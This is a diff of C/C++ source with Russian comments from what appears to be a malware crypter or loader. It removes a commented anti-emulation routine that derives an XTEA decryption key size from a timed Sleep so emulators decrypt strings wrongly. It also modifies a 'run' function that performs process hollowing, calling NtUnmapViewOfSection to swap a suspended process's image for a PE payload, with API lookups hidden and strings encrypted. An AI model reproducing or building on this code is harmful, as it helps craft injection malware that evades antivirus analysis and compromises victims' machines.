@@ -38,41 +38,6 @@ void str_to_encrypt(char *str_to_crypt, uint32_t size_str, uint32_t *key, uint32
 	XTEA_encrypt(str_to_crypt, size_str, key, size_key);
 }
 
-/*
-Функция используется для антиэмуляции, во время расшифровки строк.
-Перед раскриптовкой, происходит задержка 1 секунду, далее по меткам времени происходит вычисление, действительно-ли была задержка секунду.
-Если да, то на основе этого вычисляется размер ключа:size_key = (mesure2.wSecond - mesure1.wSecond) + 3.
-Если sleep был пропущен, то размер ключа будет неверный и расшифровка будет неправильна.
-
-Параметры функции:
-
-uintptr_t base - Адрес LoadLibraryA.
-char *crypt_str - Указате на шифрованную строку.
-uint32_t size_str - Размер строки.
-uint32_t sleep_wait - Задержка слипа в секундах.
-*/
-
-void anti_emul_sleep(uintptr_t base, char *crypt_str, uint32_t size_str, uint32_t sleep_wait) 
-{
-
-	SYSTEMTIME mesure1;
-	SYSTEMTIME mesure2;
-	uint32_t size_key = 0;
-
-	printf("#");
-	LI_GET(base, GetSystemTime)(&mesure1);
-	LI_GET(base, Sleep)(sleep_wait);
-	LI_GET(base, GetSystemTime)(&mesure2);
-	printf("#");
-
-	size_key = (mesure2.wSecond - mesure1.wSecond) + 3;
-
-	//Если эмулятор пропустит слип, то размер ключа будет неправильный, если не пропустит, то размер ключа будет 4-ре.)))
-	str_to_decrypt(crypt_str, size_str, &MAGIC, size_key);
-
-	printf("#");
-}
-
 //Фунция запуска в память, принимает:
 /*
 uintptr_t base - Адрес LoadLibraryA.
@@ -80,7 +45,7 @@ szFilePath - Полный путь до нашего модуля
 pFile - Байты PE-файла (x32 и натив).
 */
 typedef LONG(WINAPI * NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
-void run(uintptr_t base, LPSTR szFilePath, PVOID pFile)
+void run(uintptr_t base, LPSTR szFilePath, PVOID pFile, char *decrypt_ntdll, char *decrypt_NtUnmapView)
 {
 	PIMAGE_DOS_HEADER IDH;
 	PIMAGE_NT_HEADERS INH;
@@ -120,8 +85,8 @@ void run(uintptr_t base, LPSTR szFilePath, PVOID pFile)
 					LI_GET(base, ReadProcessMemory)(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&dwImageBase), 4, NULL);
 					if (DWORD(dwImageBase) == INH->OptionalHeader.ImageBase)
 					{
-						HMODULE hmodule = LI_GET(base, GetModuleHandleA)(ntdll);
-						FARPROC proc_addr = LI_GET(base, GetProcAddress)(hmodule, NtUnmapView);
+						HMODULE hmodule = LI_GET(base, GetModuleHandleA)(decrypt_ntdll);
+						FARPROC proc_addr = LI_GET(base, GetProcAddress)(hmodule, decrypt_NtUnmapView);
 
 						xNtUnmapViewOfSection = NtUnmapViewOfSection(proc_addr);
 						xNtUnmapViewOfSection(PI.hProcess, PVOID(dwImageBase));
